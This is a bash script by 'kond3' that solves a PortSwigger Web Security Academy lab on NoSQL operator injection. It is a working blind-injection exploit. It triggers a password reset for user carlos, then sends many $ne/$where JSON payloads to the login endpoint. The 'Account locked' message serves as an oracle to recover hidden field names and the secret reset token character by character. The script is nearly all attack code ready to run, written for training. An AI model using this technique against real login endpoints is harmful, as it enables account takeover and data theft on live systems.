#!/bin/bash

# Author: kond3
# Date: 30/08/2024
# Last modified: 30/08/2024 19:20:04

# Description
# Script to solve the "Exploiting NoSQL operator injection to extract unknown fields" lab from PortSwigger's NoSQL Injection topic.

# Usage
# ./unknown_field.sh <random_part_of_URL>


echo ""

if ! [ -d header ];then
	mkdir header
fi

if ! [ -d payload ];then
	mkdir payload
fi

if ! [ -f payload/payload.txt ];then
	for x in {a..z};do
		echo "$x" >> payload/payload.txt
	done
	for x in {A..Z};do
		echo "$x" >> payload/payload.txt
	done
	for x in {0..9};do
		echo "$x" >> payload/payload.txt
	done
fi

csrf=$(curl -s -k -D header/header.txt "https://$1.web-security-academy.net/forgot-password" | grep 'name="csrf"' | awk '{print $5}' | sed 's/value="//' | sed 's/">//')
session=$(cat header/header.txt | grep 'session=' | awk '{print $2}' | sed 's/;//')

curl -s -k -d "csrf=$csrf&username=carlos" -b "$session" -D header/header.txt "https://$1.web-security-academy.net/lforgot-password" &>/dev/null

curl -s -k -D header/header.txt "https://$1.web-security-academy.net/login" &>/dev/null
session=$(cat header/header.txt | grep 'session=' | awk '{print $2}' | sed 's/;//')

# while read -r p <&7;do
# 	echo "$p"
# 	curl -s -b "$session" -k -H "Content-Type: application/json" --data-raw "{\"username\":\"carlos\",\"password\":{\"\$ne\":\"kond3\"},\"\$where\":\"this.forgotPwd.match('^.{0}$p.*')\"}" "https://$1.web-security-academy.net/login" | grep 'class=is-warning' | sed 's/.*<p class=is-warning>//' | sed 's:</p>::'
# done 7< payload/payload.txt
# exit 0

# echo "$session"

# for i in {a..z};do
# 	curl -s -b "$session" -k -H "Content-Type: application/json" --data-raw "{\"username\":\"carlos\",\"password\":{\"\$ne\":\"kond3\"},\"\$where\": \"Object.keys(this)[1].match('^.{0}$i.*')\"}" "https://$1.web-security-academy.net/login" | grep 'class=is-warning'
# 	echo -e "\n-------\n"
# 	k=${i^^}
# 	curl -s -b "$session" -k -H "Content-Type: application/json" --data-raw "{\"username\":\"carlos\",\"password\":{\"\$ne\":\"kond3\"},\"\$where\": \"Object.keys(this)[1].match('^.{0}$k.*')\"}" "https://$1.web-security-academy.net/login" | grep 'class=is-warning'
# 	echo -e "\n-------\n"
# done

fields=()

for n in {1..7};do
	echo -e "Searching for field number $n..."
	field=""

	for i in {0..20};do
		prev="$field"

		for j in {a..z};do
			printf 'Payload: %s \t Field: %s \r' "$j" "$field"

			curl -s -b "$session" -k -H "Content-Type: application/json" --data-raw "{\"username\":\"carlos\",\"password\":{\"\$ne\":\"kond3\"},\"\$where\": \"Object.keys(this)[$n].match('^.{$i}$j.*')\"}" "https://$1.web-security-academy.net/login" | grep 'Account locked' &>/dev/null
			if [ $? = 0 ];then
				field+="$j"
				break
			fi

			k=${j^^}
			printf 'Payload: %s \t Field: %s \r' "$k" "$field"

			curl -s -b "$session" -k -H "Content-Type: application/json" --data-raw "{\"username\":\"carlos\",\"password\":{\"\$ne\":\"kond3\"},\"\$where\": \"Object.keys(this)[$n].match('^.{$i}$k.*')\"}" "https://$1.web-security-academy.net/login" | grep 'Account locked' &>/dev/null
			if [ $? = 0 ];then
				field+="$k"
				break
			fi
		done

		if [[ "$prev" == "$field" ]];then
			break
		fi
	done

	if [[ "$field" == "" ]];then
		echo -e "No more fields to be found. Exiting..."
		echo -e "\n--------------------------------------------------------\n"
		break
	fi

	echo -e "\n\nField found!\nField number $n : $field"

	echo -e "\n--------------------------------------------------------\n"

	fields+=("$field")

done

echo -e "Results:\n"

for i in ${!fields[@]}; do
  echo -e "Field $i: \t ${fields[$i]}"
done

token_name="${fields[-1]}"

echo -e "\n--------------------------------------------------------\n"

echo -e "Searching for token value..."

token=""

for i in {0..20};do
	prev="$token"

	while read -r p <&7;do
		printf 'Payload: %s \t Token: %s \r' "$p" "$token"
		curl -s -b "$session" -k -H "Content-Type: application/json" --data-raw "{\"username\":\"carlos\",\"password\":{\"\$ne\":\"kond3\"},\"\$where\":\"this.$token_name.match('^.{$i}$p.*')\"}" "https://$1.web-security-academy.net/login" | grep 'Account locked' &>/dev/null
		if [ $? = 0 ];then
			token+="$p"
			break
		fi	
	done 7< payload/payload.txt

	if [[ "$prev" == "$token" ]];then
		echo -e "\n\nToken found!"
		break
	fi
done

echo "Token: $token"

echo -e "\n--------------------------------------------------------\n"
echo "Sending GET request to Burp..."
curl -s -k --proxy http://127.0.0.1:8080 "https://$1.web-security-academy.net/forgot-password?$token_name=$token" &>/dev/null
echo -e "\n--------------------------------------------------------\n"

echo -e "\n\nGood luck with your PortSwigger Academy journey. \n\nPlease consider starring this repo, bye! \nkond3, $(date +%d.%m.%Y)"

echo ""
exit 0
